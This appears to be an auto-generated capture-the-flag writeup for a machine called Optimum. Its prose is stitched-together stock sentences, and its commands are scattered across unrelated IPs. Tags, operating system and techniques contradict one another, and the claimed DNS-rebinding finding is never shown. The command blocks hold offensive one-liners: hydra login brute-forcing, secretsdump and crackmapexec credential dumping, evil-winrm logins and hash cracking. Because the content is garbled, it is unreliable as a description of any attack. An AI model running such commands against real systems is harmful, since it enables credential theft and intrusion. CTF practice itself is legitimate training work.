---
TitleSEO: "PwnTillDawn — Optimum (Hard FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Optimum (Hard FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Optimum. ACL Abuse and DNS Rebinding to achieve hard compromise on FreeBSD."
Keywords: "easy, medium, forensics, linux"
URL: "https://zurefx.github.io/writeups/htb-optimum-343.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-optimum-343/"
Date: "2025-11-27"
Tags: "Easy, Medium, Forensics, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-optimum-343"
Permalink: "/writeups/htb-optimum-343.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Optimum** is rated **Hard** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.89.1.244`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.195.66 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.21.87.29
gobuster dir -u http://10.98.193.95/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
crackmapexec smb 10.98.207.181 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.57.152.36 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.24.56
```

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.146.229
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.237.226 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

Key finding: **DNS Rebinding**.

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
nmap -sCV -p25,5986,139 10.23.114.176 -oN scan.txt
evil-winrm -i 10.19.12.129 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.175.237
```

The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.212.90 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.31.117/FUZZ
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```powershell
nmap -sCV -p25,135,80 10.87.145.196 -oN scan.txt
nmap -sCV -p80,53,5985 10.116.178.133 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `evil-winrm`
- `pwncat`
- `john`
- `mimikatz`
- `kerbrute`
- `nmap`
- `impacket`

### Key Takeaways

- ACL Abuse
- DNS Rebinding
- IDOR
